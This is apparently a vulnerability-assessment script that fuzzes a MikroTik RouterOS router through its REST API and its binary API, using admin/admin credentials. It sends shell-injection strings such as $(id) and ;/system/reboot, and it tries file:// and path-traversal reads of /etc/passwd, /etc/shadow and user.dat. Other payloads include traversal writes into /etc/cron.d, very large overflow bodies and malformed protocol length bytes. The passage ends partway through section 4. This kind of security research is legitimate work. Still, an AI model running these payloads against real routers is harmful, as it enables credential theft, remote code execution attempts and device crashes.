#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 -- libumsg.so Indirect Attack Assessment
Phase 9 (Novel Finding Hunting), Track C
Target: [REDACTED-INTERNAL-IP] (pristine CHR instance, [REDACTED-CREDS])

Binary context:
  libumsg.so is the IPC backbone of ALL RouterOS services.
  It imports execve, sprintf, strcpy, and realpath -- the most dangerous
  combination in a shared library used by every daemon on the system.
  We attack it indirectly by sending crafted inputs through network-facing
  services (REST API, RouterOS API) that relay messages through libumsg.

Tests (~120 total):
  1. Command Execution Paths via REST API      (~25 tests)
     Shell metacharacters in tool/fetch URLs, system/script source,
     export filenames, interface names, firewall comments, identity
  2. sprintf/strcpy Overflow via Message Protocol (~25 tests)
     Oversized field values at power-of-2 boundaries, embedded nulls,
     long names/comments across object types
  3. Path Resolution Attacks                   (~25 tests)
     Path traversal in /rest/file, file:// URLs via tool/fetch,
     backup name injection, null byte truncation in paths
  4. Message Protocol Fuzzing via RouterOS API  (~25 tests)
     Malformed length bytes, oversized words, truncated messages,
     invalid commands, zero-length words, binary garbage
  5. Format String via Logging/Error Paths     (~20 tests)
     Format specifiers in object names/comments, trigger error logging
     with user-controlled strings, check log expansion

SAFETY:
  %n tests are performed LAST with extra health monitoring.
  Crash detection via uptime comparison runs after every dangerous test.

Evidence: evidence/attack_libumsg_indirect.json
"""

import base64
import hashlib
import json
import os
import re
import socket
import struct
import sys
import time
import warnings
from datetime import datetime
from pathlib import Path

import requests
import urllib3

# Suppress SSL / urllib3 warnings
warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Shared module ────────────────────────────────────────────────────────────
sys.path.insert(0, str(Path(__file__).parent))
from mikrotik_common import (
    EvidenceCollector, pull_router_logs, pull_logs_before_destructive_action,
    check_router_alive, wait_for_router, log, EVIDENCE_DIR,
)

# ── Target Configuration (override for pristine instance) ─────────────────
TARGET = "[REDACTED-INTERNAL-IP]"
ADMIN_USER = "admin"
ADMIN_PASS = "admin"
AUTH = (ADMIN_USER, ADMIN_PASS)
TIMEOUT = 10

# Override the TARGET in mikrotik_common so health checks / log pulls use 113
import mikrotik_common
mikrotik_common.TARGET = TARGET
mikrotik_common.ADMIN_USER = ADMIN_USER
mikrotik_common.ADMIN_PASS = ADMIN_PASS

ec = EvidenceCollector("attack_libumsg_indirect.py", phase=9)

# ── State tracking ──────────────────────────────────────────────────────────
CRASH_DETECTED = False
CRASH_COUNT = 0

# Objects to clean up at the end
CLEANUP = {
    "scripts": [],
    "schedulers": [],
    "firewall_rules": [],
    "queues": [],
    "addresses": [],
}


# =============================================================================
# Helpers
# =============================================================================

def rest_request(method, path, data=None, timeout=10):
    """Make REST API request to target. Returns (status_code, body)."""
    url = f"http://{TARGET}/rest{path}"
    headers = {"Content-Type": "application/json"}
    try:
        if method == "GET":
            r = requests.get(url, auth=AUTH, timeout=timeout, verify=False)
        elif method == "POST":
            r = requests.post(url, auth=AUTH, json=data, headers=headers,
                              timeout=timeout, verify=False)
        elif method == "PATCH":
            r = requests.patch(url, auth=AUTH, json=data, headers=headers,
                               timeout=timeout, verify=False)
        elif method == "PUT":
            r = requests.put(url, auth=AUTH, json=data, headers=headers,
                             timeout=timeout, verify=False)
        elif method == "DELETE":
            r = requests.delete(url, auth=AUTH, timeout=timeout, verify=False)
        else:
            return 0, f"Unsupported method: {method}"
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, r.text
    except requests.exceptions.Timeout:
        return 0, "Request timed out"
    except requests.exceptions.ConnectionError as e:
        return 0, f"Connection error: {e}"
    except Exception as e:
        return 0, str(e)


def health_check():
    """Check if router is alive. Returns dict with alive, uptime, version."""
    try:
        r = requests.get(f"http://{TARGET}/rest/system/resource",
                         auth=AUTH, timeout=5, verify=False)
        if r.status_code == 200:
            data = r.json()
            return {
                "alive": True,
                "uptime": data.get("uptime"),
                "version": data.get("version"),
                "cpu_load": data.get("cpu-load"),
                "free_memory": data.get("free-memory"),
            }
    except Exception:
        pass
    return {"alive": False}


def detect_crash(pre_health, post_health):
    """Detect if router crashed between two health checks."""
    if not post_health.get("alive"):
        return True
    pre_up = pre_health.get("uptime", "")
    post_up = post_health.get("uptime", "")
    if pre_up and post_up:
        pre_secs = _uptime_to_seconds(pre_up)
        post_secs = _uptime_to_seconds(post_up)
        if pre_secs is not None and post_secs is not None and post_secs < pre_secs:
            return True
    return False


def _uptime_to_seconds(uptime_str):
    """Parse RouterOS uptime string like '1d2h3m4s' to total seconds."""
    if not uptime_str:
        return None
    total = 0
    try:
        parts = re.findall(r'(\d+)([wdhms])', uptime_str)
        multipliers = {'w': 604800, 'd': 86400, 'h': 3600, 'm': 60, 's': 1}
        for val, unit in parts:
            total += int(val) * multipliers.get(unit, 0)
        return total if total > 0 else None
    except Exception:
        return None


def handle_crash(test_name):
    """Handle a detected crash: wait for recovery, record."""
    global CRASH_DETECTED, CRASH_COUNT
    CRASH_DETECTED = True
    CRASH_COUNT += 1
    log(f"  CRASH #{CRASH_COUNT} detected during '{test_name}' -- waiting for recovery...")
    recovery = wait_for_router(max_wait=120, check_interval=5)
    return recovery


def track_created_object(category, status, resp):
    """Track an object ID for cleanup. Returns the ID or None."""
    if status in (200, 201) and isinstance(resp, dict):
        oid = resp.get("ret") or resp.get(".id")
        if oid:
            CLEANUP.setdefault(category, []).append(oid)
            return oid
    return None


def cleanup_created_objects():
    """Remove all objects created during testing."""
    log("Cleaning up created objects...")
    cleaned = 0

    delete_map = {
        "scripts":        "/system/script",
        "schedulers":     "/system/scheduler",
        "firewall_rules": "/ip/firewall/filter",
        "queues":         "/queue/simple",
        "addresses":      "/ip/address",
    }

    for category, base_path in delete_map.items():
        for oid in CLEANUP.get(category, []):
            try:
                rest_request("DELETE", f"{base_path}/{oid}")
                cleaned += 1
            except Exception:
                pass

    log(f"  Cleaned up {cleaned} objects")
    return cleaned


def truncate(text, max_len=500):
    """Truncate text for JSON evidence storage."""
    if not text:
        return ""
    s = str(text)
    if len(s) <= max_len:
        return s
    return s[:max_len] + f"... [truncated, total {len(s)} chars]"


def pull_logs_and_search(keywords):
    """Pull router logs and search for entries matching keywords.
    Returns list of matching log entries."""
    matches = []
    try:
        r = requests.get(f"http://{TARGET}/rest/log",
                         auth=AUTH, timeout=15, verify=False)
        if r.status_code == 200:
            for entry in r.json():
                msg = entry.get("message", "").lower()
                if any(kw.lower() in msg for kw in keywords):
                    matches.append(entry)
    except Exception:
        pass
    return matches


# ── RouterOS API protocol helpers ────────────────────────────────────────────

def ros_api_connect(timeout=10):
    """Connect to RouterOS API on port 8728."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((TARGET, 8728))
    return s


def ros_api_encode_length(length):
    """Encode a word length using RouterOS API length encoding."""
    if length < 0x80:
        return bytes([length])
    elif length < 0x4000:
        length |= 0x8000
        return struct.pack("!H", length)
    elif length < 0x200000:
        length |= 0xC00000
        return struct.pack("!I", length)[1:]
    elif length < 0x10000000:
        length |= 0xE0000000
        return struct.pack("!I", length)
    else:
        return b'\xf0' + struct.pack("!I", length)


def ros_api_send_word(sock, word):
    """Send a word in RouterOS API protocol format."""
    if isinstance(word, str):
        word = word.encode('utf-8')
    length = len(word)
    sock.send(ros_api_encode_length(length) + word)


def ros_api_send_sentence(sock, words):
    """Send a sentence (list of words + empty word terminator)."""
    for word in words:
        ros_api_send_word(sock, word)
    sock.send(b'\x00')  # Empty word = end of sentence


def ros_api_read_response(sock, timeout=5):
    """Read response words until we get a sentence terminator or timeout.
    Returns list of words (strings)."""
    words = []
    sock.settimeout(timeout)
    try:
        while True:
            # Read length
            first_byte = sock.recv(1)
            if not first_byte:
                break
            b0 = first_byte[0]
            if b0 == 0x00:
                break  # Sentence terminator

            if b0 < 0x80:
                word_len = b0
            elif b0 < 0xC0:
                b1 = sock.recv(1)[0]
                word_len = ((b0 & 0x3F) << 8) | b1
            elif b0 < 0xE0:
                extra = sock.recv(2)
                word_len = ((b0 & 0x1F) << 16) | (extra[0] << 8) | extra[1]
            elif b0 < 0xF0:
                extra = sock.recv(3)
                word_len = ((b0 & 0x0F) << 24) | (extra[0] << 16) | (extra[1] << 8) | extra[2]
            else:
                extra = sock.recv(4)
                word_len = struct.unpack("!I", extra)[0]

            # Read word data
            data = b''
            while len(data) < word_len:
                chunk = sock.recv(word_len - len(data))
                if not chunk:
                    break
                data += chunk
            words.append(data.decode('utf-8', errors='replace'))
    except socket.timeout:
        pass
    except Exception:
        pass
    return words


def ros_api_login(sock):
    """Login to RouterOS API using the plaintext method (7.x+).
    Returns True on success."""
    ros_api_send_sentence(sock, ["/login", f"=name={ADMIN_USER}", f"=password={ADMIN_PASS}"])
    resp = ros_api_read_response(sock)
    return any("!done" in w for w in resp)


# =============================================================================
# Section 1: Command Execution Paths via REST API (~25 tests)
# =============================================================================

def test_command_execution_paths():
    """Target code paths in libumsg that may reach execve().

    Shell metacharacters in tool/fetch URLs, system/script source,
    export filenames, interface names, firewall comments, identity.
    """
    log("=" * 70)
    log("SECTION 1: Command Execution Paths via REST API")
    log("=" * 70)

    pre_health = health_check()
    log(f"  Pre-test health: alive={pre_health.get('alive')}, "
        f"uptime={pre_health.get('uptime')}")

    # ── 1a: /rest/tool/fetch with crafted URLs (8 tests) ─────────────────
    fetch_payloads = [
        ("shell_semicolon",   "http://127.0.0.1/;whoami"),
        ("shell_pipe",        "http://127.0.0.1/|id"),
        ("shell_ampersand",   "http://127.0.0.1/&&id"),
        ("shell_backtick",    "http://127.0.0.1/`id`"),
        ("shell_subshell",    "http://127.0.0.1/$(id)"),
        ("file_proto_passwd", "file:///etc/passwd"),
        ("file_proto_shadow", "file:///etc/shadow"),
        ("file_proto_userdat","file:///flash/rw/store/user.dat"),
    ]

    for name, url in fetch_payloads:
        pre = health_check()
        status, resp = rest_request("POST", "/tool/fetch",
                                    {"url": url, "mode": "http",
                                     "dst-path": "/dev/null", "as-value": "true"},
                                    timeout=15)
        post = health_check()
        crashed = detect_crash(pre, post)

        is_anomaly = crashed or status == 0
        # Check if sensitive content was returned
        resp_str = truncate(str(resp))
        if status in (200, 201) and isinstance(resp, dict):
            data_val = str(resp.get("data", ""))
            if "root:" in data_val or "shadow" in data_val or "admin" in data_val.lower():
                is_anomaly = True

        ec.add_test(
            "cmd_exec_fetch", f"fetch URL injection: {name}",
            f"POST /tool/fetch with URL containing shell metachar: {url}",
            f"HTTP {status}, crashed={crashed}",
            {"url": url, "status": status, "response": resp_str,
             "pre_uptime": pre.get("uptime"), "post_uptime": post.get("uptime"),
             "crashed": crashed},
            anomaly=is_anomaly,
        )

        if crashed:
            handle_crash(f"fetch_{name}")
            ec.add_finding(
                "CRITICAL",
                f"Router crash via /tool/fetch URL injection ({name})",
                f"Sending {url} to /tool/fetch caused router crash/reboot.",
                cwe="CWE-78", cvss="9.8",
                evidence_refs=[f"fetch_{name}"],
            )

        if status in (200, 201) and "root:" in str(resp):
            ec.add_finding(
                "CRITICAL",
                f"Local file read via /tool/fetch ({name})",
                f"file:// URL returned system file contents via /tool/fetch.",
                cwe="CWE-73", cvss="8.6",
                evidence_refs=[f"fetch_{name}"],
            )

        time.sleep(0.3)

    # ── 1b: /rest/system/script with injection payloads (5 tests) ────────
    script_payloads = [
        ("backtick_name",    {"name": "_test_`id`", "source": ":log info ok"}),
        ("subshell_source",  {"name": "_test_subsh", "source": "$(id)"}),
        ("pipe_source",      {"name": "_test_pipe", "source": "|cat /etc/passwd"}),
        ("semicolon_source", {"name": "_test_semi", "source": ";/system/reboot"}),
        ("newline_source",   {"name": "_test_nl", "source": ":log info safe\n/system/reboot"}),
    ]

    for name, data in script_payloads:
        pre = health_check()
        status, resp = rest_request("POST", "/system/script/add", data)
        post = health_check()
        crashed = detect_crash(pre, post)

        track_created_object("scripts", status, resp)

        ec.add_test(
            "cmd_exec_script", f"script injection: {name}",
            f"Add script with injection payload in name/source",
            f"HTTP {status}, crashed={crashed}",
            {"payload_name": name, "data": data, "status": status,
             "response": truncate(resp), "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"script_{name}")
        time.sleep(0.3)

    # ── 1c: /rest/export with filename injection (3 tests) ───────────────
    export_payloads = [
        ("traversal",     "../../etc/cron.d/evil"),
        ("semicolon",     "test;id"),
        ("null_truncate", "safe\x00.rsc"),
    ]

    for name, filename in export_payloads:
        pre = health_check()
        status, resp = rest_request("POST", "/export",
                                    {"file": filename}, timeout=15)
        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "cmd_exec_export", f"export filename injection: {name}",
            f"POST /export with crafted filename: {repr(filename)}",
            f"HTTP {status}, crashed={crashed}",
            {"filename": repr(filename), "status": status,
             "response": truncate(resp), "crashed": crashed},
            anomaly=crashed or (status in (200, 201) and ".." in filename),
        )

        if crashed:
            handle_crash(f"export_{name}")
        time.sleep(0.3)

    # ── 1d: Shell metachar in object fields (9 tests) ────────────────────
    field_payloads = [
        ("identity_semicolon",    "POST", "/system/identity/set",
         {"name": "test;id"}),
        ("identity_subshell",     "POST", "/system/identity/set",
         {"name": "test$(whoami)"}),
        ("identity_backtick",     "POST", "/system/identity/set",
         {"name": "test`uname`"}),
        ("firewall_comment_sub",  "POST", "/ip/firewall/filter/add",
         {"chain": "forward", "action": "accept",
          "comment": "$(cat /etc/passwd)"}),
        ("firewall_comment_pipe", "POST", "/ip/firewall/filter/add",
         {"chain": "forward", "action": "accept",
          "comment": "test|id"}),
        ("interface_name_semi",   "PATCH", "/interface/ether1",
         {"comment": ";/system/reboot"}),
        ("scheduler_onevent",     "POST", "/system/scheduler/add",
         {"name": "_test_sched_inj", "on-event": "$(id)",
          "interval": "99d"}),
        ("queue_name_inject",     "POST", "/queue/simple/add",
         {"name": "_test_q_`id`", "target": "0.0.0.0/0"}),
        ("package_source_url",    "POST", "/system/package/update/set",
         {"channel": "testing;id"}),
    ]

    for name, method, path, data in field_payloads:
        pre = health_check()
        status, resp = rest_request(method, path, data)
        post = health_check()
        crashed = detect_crash(pre, post)

        # Track for cleanup
        if "firewall" in path:
            track_created_object("firewall_rules", status, resp)
        elif "scheduler" in path:
            track_created_object("schedulers", status, resp)
        elif "queue" in path:
            track_created_object("queues", status, resp)
        elif "script" in path:
            track_created_object("scripts", status, resp)

        ec.add_test(
            "cmd_exec_fields", f"field injection: {name}",
            f"{method} {path} with shell metacharacters",
            f"HTTP {status}, crashed={crashed}",
            {"payload_name": name, "method": method, "path": path,
             "data": {k: repr(v) for k, v in data.items()},
             "status": status, "response": truncate(resp),
             "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"field_{name}")
        time.sleep(0.3)

    # Restore identity
    rest_request("POST", "/system/identity/set", {"name": "MikroTik"})

    log(f"  Section 1 complete")


# =============================================================================
# Section 2: sprintf/strcpy Overflow via Message Protocol (~25 tests)
# =============================================================================

def test_sprintf_overflow():
    """Target: fields that get sprintf'd into fixed buffers inside libumsg.

    Oversized values, embedded null bytes, power-of-2 boundary lengths.
    """
    log("=" * 70)
    log("SECTION 2: sprintf/strcpy Overflow via Message Protocol")
    log("=" * 70)

    # ── 2a: Oversized identity name (4 tests) ───────────────────────────
    identity_sizes = [
        ("64KB",  64 * 1024),
        ("256KB", 256 * 1024),
        ("512KB", 512 * 1024),
        ("1MB",   1024 * 1024),
    ]

    for label, size in identity_sizes:
        payload = "A" * size
        pre = health_check()
        status, resp = rest_request("POST", "/system/identity/set",
                                    {"name": payload}, timeout=30)
        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "overflow_identity", f"identity name {label}",
            f"Set system identity to {label} string of 'A's",
            f"HTTP {status}, crashed={crashed}",
            {"size": size, "status": status,
             "response": truncate(resp), "crashed": crashed,
             "pre_uptime": pre.get("uptime"),
             "post_uptime": post.get("uptime")},
            anomaly=crashed or status >= 500,
        )

        if crashed:
            handle_crash(f"identity_{label}")
            ec.add_finding(
                "CRITICAL",
                f"Router crash with {label} identity name (sprintf/strcpy overflow)",
                f"Setting system identity to {size} bytes crashed the router. "
                f"This suggests a fixed-size buffer overflow in libumsg's "
                f"message handling path.",
                cwe="CWE-120", cvss="9.8",
                evidence_refs=[f"identity_{label}"],
            )
        time.sleep(0.5)

    # Restore identity
    rest_request("POST", "/system/identity/set", {"name": "MikroTik"})

    # ── 2b: Oversized comments on various objects (5 tests) ──────────────
    comment_targets = [
        ("firewall_comment", "POST", "/ip/firewall/filter/add",
         {"chain": "forward", "action": "accept"}, "firewall_rules"),
        ("address_comment",  "POST", "/ip/address/add",
         {"address": "[REDACTED-INTERNAL-IP]/24", "interface": "ether1"}, "addresses"),
        ("script_name",      "POST", "/system/script/add",
         {"source": ":log info test"}, "scripts"),
        ("scheduler_name",   "POST", "/system/scheduler/add",
         {"on-event": ":log info test", "interval": "99d"}, "schedulers"),
        ("queue_name",       "POST", "/queue/simple/add",
         {"target": "0.0.0.0/0"}, "queues"),
    ]

    for name, method, path, base_data, cleanup_cat in comment_targets:
        data = dict(base_data)
        if "comment" in name:
            data["comment"] = "X" * 65536
        elif "name" in name:
            data["name"] = "_overflow_" + "D" * 65530

        pre = health_check()
        status, resp = rest_request(method, path, data, timeout=20)
        post = health_check()
        crashed = detect_crash(pre, post)

        track_created_object(cleanup_cat, status, resp)

        ec.add_test(
            "overflow_comments", f"oversized {name} (64KB)",
            f"Create object with 64KB string in {name}",
            f"HTTP {status}, crashed={crashed}",
            {"target": name, "field_size": 65536, "status": status,
             "response": truncate(resp), "crashed": crashed},
            anomaly=crashed or status >= 500,
        )

        if crashed:
            handle_crash(f"overflow_{name}")
            ec.add_finding(
                "HIGH",
                f"Router crash with oversized {name} (sprintf overflow)",
                f"Creating object with 64KB {name} field crashed the router.",
                cwe="CWE-120", cvss="8.1",
                evidence_refs=[f"overflow_{name}"],
            )
        time.sleep(0.3)

    # ── 2c: Power-of-2 boundary sizes (8 tests) ─────────────────────────
    boundary_sizes = [255, 256, 511, 512, 1023, 1024, 4095, 4096]

    for size in boundary_sizes:
        payload = "B" * size
        pre = health_check()
        status, resp = rest_request("POST", "/system/script/add",
                                    {"name": f"_bnd_{size}", "source": payload})
        post = health_check()
        crashed = detect_crash(pre, post)

        track_created_object("scripts", status, resp)

        ec.add_test(
            "overflow_boundary", f"boundary size {size}",
            f"Create script with source length={size} (power-of-2 boundary test)",
            f"HTTP {status}, crashed={crashed}",
            {"size": size, "status": status,
             "response": truncate(resp), "crashed": crashed},
            anomaly=crashed or status >= 500,
        )

        if crashed:
            handle_crash(f"boundary_{size}")
        time.sleep(0.2)

    # ── 2d: Embedded null bytes (4 tests) ────────────────────────────────
    null_payloads = [
        ("identity_null",  "POST", "/system/identity/set",
         {"name": "AAA\x00BBB"}),
        ("script_null",    "POST", "/system/script/add",
         {"name": "_null_test", "source": "echo\x00inject"}),
        ("comment_null",   "POST", "/ip/firewall/filter/add",
         {"chain": "forward", "action": "accept",
          "comment": "before\x00after"}),
        ("scheduler_null", "POST", "/system/scheduler/add",
         {"name": "_null_sched\x00evil", "on-event": ":log info ok",
          "interval": "99d"}),
    ]

    for name, method, path, data in null_payloads:
        pre = health_check()
        status, resp = rest_request(method, path, data)
        post = health_check()
        crashed = detect_crash(pre, post)

        if "firewall" in path:
            track_created_object("firewall_rules", status, resp)
        elif "script" in path:
            track_created_object("scripts", status, resp)
        elif "scheduler" in path:
            track_created_object("schedulers", status, resp)

        # Check if null byte truncated the value
        truncated = False
        if status in (200, 201):
            # Read back
            if "identity" in path:
                rs, rr = rest_request("GET", "/system/identity")
                if rs == 200 and isinstance(rr, dict):
                    stored = rr.get("name", "")
                    if stored == "AAA":
                        truncated = True

        ec.add_test(
            "overflow_nullbyte", f"null byte: {name}",
            f"Send embedded null byte in {name} field",
            f"HTTP {status}, crashed={crashed}, null_truncated={truncated}",
            {"name": name, "status": status, "response": truncate(resp),
             "crashed": crashed, "null_truncated": truncated},
            anomaly=crashed or truncated,
        )

        if crashed:
            handle_crash(f"null_{name}")

        if truncated:
            ec.add_finding(
                "MEDIUM",
                f"Null byte truncation in {name}",
                f"Embedded null byte caused string truncation, indicating "
                f"C-style string handling in libumsg message path.",
                cwe="CWE-158",
                evidence_refs=[f"null_{name}"],
            )
        time.sleep(0.2)

    # ── 2e: Very large POST body (4 tests) ───────────────────────────────
    large_body_sizes = [
        ("100KB_body", 100 * 1024),
        ("1MB_body",   1024 * 1024),
        ("5MB_body",   5 * 1024 * 1024),
        ("10MB_body",  10 * 1024 * 1024),
    ]

    for label, size in large_body_sizes:
        pre = health_check()
        try:
            payload = json.dumps({"name": "A" * size})
            r = requests.post(
                f"http://{TARGET}/rest/system/identity/set",
                auth=AUTH,
                headers={"Content-Type": "application/json"},
                data=payload.encode('utf-8'),
                timeout=30, verify=False)
            status = r.status_code
            try:
                resp = r.json()
            except Exception:
                resp = r.text[:500]
        except Exception as e:
            status = 0
            resp = str(e)

        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "overflow_large_body", f"large POST body: {label}",
            f"Send {label} JSON body to /system/identity/set",
            f"HTTP {status}, crashed={crashed}",
            {"size": size, "label": label, "status": status,
             "response": truncate(resp), "crashed": crashed},
            anomaly=crashed or status >= 500 or status == 0,
        )

        if crashed:
            handle_crash(f"largebody_{label}")
        time.sleep(0.5)

    # Restore identity
    rest_request("POST", "/system/identity/set", {"name": "MikroTik"})

    log(f"  Section 2 complete")


# =============================================================================
# Section 3: Path Resolution Attacks (~25 tests)
# =============================================================================

def test_path_resolution():
    """Target: realpath() and file resolution in libumsg.

    Path traversal via /rest/file, file:// URLs, backup name injection,
    null byte truncation in file paths.
    """
    log("=" * 70)
    log("SECTION 3: Path Resolution Attacks")
    log("=" * 70)

    # ── 3a: Path traversal via /rest/file endpoint (8 tests) ─────────────
    traversal_paths = [
        ("dotdot_etc_passwd",          "/file/../../etc/passwd"),
        ("encoded_dotdot",             "/file/%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        ("double_encoded",             "/file/%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
        ("backslash_traversal",        "/file/..\\..\\etc\\passwd"),
        ("unicode_dotdot",             "/file/..%c0%af..%c0%afetc%c0%afpasswd"),
        ("null_truncate_path",         "/file/../../etc/passwd%00.txt"),
        ("user_dat_direct",            "/file/flash/rw/store/user.dat"),
        ("proc_self_maps",             "/file/../../proc/self/maps"),
    ]

    for name, path in traversal_paths:
        pre = health_check()
        status, resp = rest_request("GET", path)
        post = health_check()
        crashed = detect_crash(pre, post)

        resp_str = truncate(str(resp))
        # Check if sensitive content leaked
        sensitive_leak = False
        if status == 200:
            lower_resp = str(resp).lower()
            if "root:" in lower_resp or "shadow" in lower_resp:
                sensitive_leak = True
            if "admin" in lower_resp and "password" in lower_resp:
                sensitive_leak = True

        ec.add_test(
            "path_traversal_file", f"file path traversal: {name}",
            f"GET /rest{path} -- test realpath bypass in libumsg",
            f"HTTP {status}, crashed={crashed}, sensitive_leak={sensitive_leak}",
            {"path": path, "status": status, "response": resp_str,
             "crashed": crashed, "sensitive_leak": sensitive_leak},
            anomaly=crashed or sensitive_leak,
        )

        if sensitive_leak:
            ec.add_finding(
                "CRITICAL",
                f"Path traversal file read via /rest/file ({name})",
                f"GET /rest{path} returned sensitive file contents.",
                cwe="CWE-22", cvss="9.1",
                evidence_refs=[f"traversal_{name}"],
            )

        if crashed:
            handle_crash(f"traversal_{name}")
        time.sleep(0.2)

    # ── 3b: file:// protocol via /tool/fetch (5 tests) ──────────────────
    file_urls = [
        ("fetch_passwd",      "file:///etc/passwd"),
        ("fetch_userdat",     "file:///flash/rw/store/user.dat"),
        ("fetch_proc_maps",   "file:///proc/self/maps"),
        ("fetch_rw_config",   "file:///flash/rw/store/config.dat"),
        ("fetch_shadow",      "file:///etc/shadow"),
    ]

    for name, url in file_urls:
        pre = health_check()
        status, resp = rest_request("POST", "/tool/fetch",
                                    {"url": url, "mode": "http",
                                     "dst-path": "/dev/null",
                                     "as-value": "true"}, timeout=15)
        post = health_check()
        crashed = detect_crash(pre, post)

        resp_str = truncate(str(resp))
        fetched_content = False
        if status in (200, 201) and isinstance(resp, dict):
            data_val = str(resp.get("data", ""))
            if len(data_val) > 10 and "error" not in data_val.lower():
                fetched_content = True

        ec.add_test(
            "path_fetch_file", f"fetch file:// protocol: {name}",
            f"POST /tool/fetch with {url}",
            f"HTTP {status}, crashed={crashed}, fetched_content={fetched_content}",
            {"url": url, "status": status, "response": resp_str,
             "crashed": crashed, "fetched_content": fetched_content},
            anomaly=crashed or fetched_content,
        )

        if fetched_content:
            ec.add_finding(
                "HIGH",
                f"Local file read via /tool/fetch file:// ({name})",
                f"/tool/fetch accepted file:// URL and returned file contents.",
                cwe="CWE-73", cvss="7.5",
                evidence_refs=[f"fetch_file_{name}"],
            )

        if crashed:
            handle_crash(f"fetch_file_{name}")
        time.sleep(0.3)

    # ── 3c: Export / backup with path traversal (4 tests) ────────────────
    backup_payloads = [
        ("backup_traversal",   "/system/backup/save",
         {"name": "../../etc/cron.d/evil"}),
        ("backup_null_trunc",  "/system/backup/save",
         {"name": "safe\x00../../etc/evil"}),
        ("export_traversal",   "/export",
         {"file": "../../../tmp/pwned"}),
        ("export_pipe",        "/export",
         {"file": "test|id"}),
    ]

    for name, path, data in backup_payloads:
        pre = health_check()
        status, resp = rest_request("POST", path, data, timeout=20)
        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "path_backup_export", f"backup/export injection: {name}",
            f"POST /rest{path} with crafted filename",
            f"HTTP {status}, crashed={crashed}",
            {"name": name, "path": path, "data": {k: repr(v) for k, v in data.items()},
             "status": status, "response": truncate(resp), "crashed": crashed},
            anomaly=crashed or (status in (200, 201) and ".." in str(data)),
        )

        if crashed:
            handle_crash(f"backup_{name}")
        time.sleep(0.3)

    # ── 3d: Null byte path injection (4 tests) ──────────────────────────
    null_path_payloads = [
        ("null_in_file_path",  "/file/test%00../../etc/passwd"),
        ("null_in_rest_path",  "/system/resource%00/../../../etc/passwd"),
        ("null_ext_bypass",    "/file/safe.txt%00.rsc"),
        ("null_double",        "/file/a%00b%00c%00d"),
    ]

    for name, path in null_path_payloads:
        pre = health_check()
        status, resp = rest_request("GET", path)
        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "path_null_injection", f"null byte in path: {name}",
            f"GET /rest{path} -- null byte path truncation test",
            f"HTTP {status}, crashed={crashed}",
            {"path": path, "status": status, "response": truncate(resp),
             "crashed": crashed},
            anomaly=crashed or status == 200,
        )

        if crashed:
            handle_crash(f"nullpath_{name}")
        time.sleep(0.2)

    # ── 3e: Direct access to sensitive file paths (4 tests) ─────────────
    direct_paths = [
        ("direct_userdat",     "/file/user.dat"),
        ("direct_configdat",   "/file/config.dat"),
        ("direct_flash_rw",    "/file/flash"),
        ("direct_rw_store",    "/file/flash/rw/store"),
    ]

    for name, path in direct_paths:
        status, resp = rest_request("GET", path)

        sensitive = False
        if status == 200:
            resp_lower = str(resp).lower()
            if any(kw in resp_lower for kw in ["password", "secret", "hash"]):
                sensitive = True

        ec.add_test(
            "path_direct_access", f"direct file access: {name}",
            f"GET /rest{path} -- attempt direct sensitive file access",
            f"HTTP {status}, sensitive_content={sensitive}",
            {"path": path, "status": status, "response": truncate(resp),
             "sensitive": sensitive},
            anomaly=sensitive,
        )

        if sensitive:
            ec.add_finding(
                "HIGH",
                f"Sensitive file accessible via REST API ({name})",
                f"GET /rest{path} returned content containing credentials.",
                cwe="CWE-538", cvss="7.5",
                evidence_refs=[f"direct_{name}"],
            )
        time.sleep(0.2)

    log(f"  Section 3 complete")


# =============================================================================
# Section 4: Message Protocol Fuzzing via RouterOS API (~25 tests)
# =============================================================================

def test_api_protocol_fuzzing():
    """Connect to port 8728 (RouterOS API) and send malformed messages.

    Malformed length bytes, oversized words, truncated messages,
    invalid commands, zero-length words, binary garbage.
    """
    log("=" * 70)
    log("SECTION 4: Message Protocol Fuzzing via RouterOS API")
    log("=" * 70)

    # ── 4a: Malformed length bytes (5 tests) ────────────────────────────
    malformed_lengths = [
        ("max_int_length",    b'\xf0\xff\xff\xff\xff'),   # Claim 4GB length
        ("huge_3byte",        b'\xdf\xff\xff'),            # 3-byte max
        ("huge_4byte",        b'\xef\xff\xff\xff'),        # 4-byte max
        ("invalid_prefix_f1", b'\xf1\x00\x00\x00\x01'),   # Invalid 0xF1 prefix
        ("invalid_prefix_ff", b'\xff\xff\xff\xff\xff'),    # All 0xFF
    ]

    for name, length_bytes in malformed_lengths:
        pre = health_check()
        result_str = ""
        try:
            s = ros_api_connect(timeout=5)
            s.send(length_bytes)
            # Send a small amount of data regardless
            s.send(b'A' * 16)
            time.sleep(1)
            # Try to read response
            try:
                resp = s.recv(4096)
                result_str = f"Got {len(resp)} bytes response"
            except socket.timeout:
                result_str = "Timeout (no response)"
            except Exception as e:
                result_str = f"Read error: {e}"
            s.close()
        except Exception as e:
            result_str = f"Connection error: {e}"

        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "api_malformed_length", f"malformed length: {name}",
            f"Send malformed length prefix {length_bytes.hex()} to API port 8728",
            f"{result_str}, crashed={crashed}",
            {"name": name, "length_hex": length_bytes.hex(),
             "result": result_str, "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"api_length_{name}")
            ec.add_finding(
                "HIGH",
                f"Router crash via malformed API length ({name})",
                f"Sending malformed length prefix {length_bytes.hex()} to "
                f"RouterOS API port 8728 crashed the router.",
                cwe="CWE-120", cvss="8.6",
                evidence_refs=[f"api_length_{name}"],
            )
        time.sleep(0.5)

    # ── 4b: Oversized word (claimed large, sent small) (3 tests) ────────
    oversized_words = [
